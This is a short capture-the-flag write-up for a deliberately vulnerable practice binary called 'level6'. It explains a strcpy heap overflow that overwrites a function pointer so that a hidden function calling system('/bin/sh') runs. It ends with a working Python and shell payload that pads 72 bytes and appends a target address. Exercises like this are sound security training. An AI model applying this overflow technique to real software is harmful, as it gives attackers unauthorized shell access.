# LEVEL6

## EXPLANATIONS

### BINARY BEHAVIOR

- function `main`, `m` and `n`
  - n is never called
  - m is called through a function pointer stored in buf2
  - `main` function
    - allocates 2 heap buffers
      - one of 64 bytes
      - one of 4 bytes
    - `strcpy` argv[1] in buf1
    - makes function pointer point to `m`
  - `m` function
    - calls `puts("Nope")`
  - `n` function
    - calls `system("/bin/sh")`

### EXPLOIT STRATEGY

- Printing heap from buf1 addr, we see that buf2 is 72 bytes further in the heap addresses.
- As strcpy does not copy a given number of characters, we did a heap overflow to write address of n at buf2 heap memory location.
  - => argv1 is copied to buf1 which overflows into buf2

### RUN COMMAND

```
python -c "print('A' * 72 + '\x08\x04\x84\x54'[::-1])" > /tmp/argv1_string
/home/user/level6/level6 $(cat /tmp/argv1_string)
```
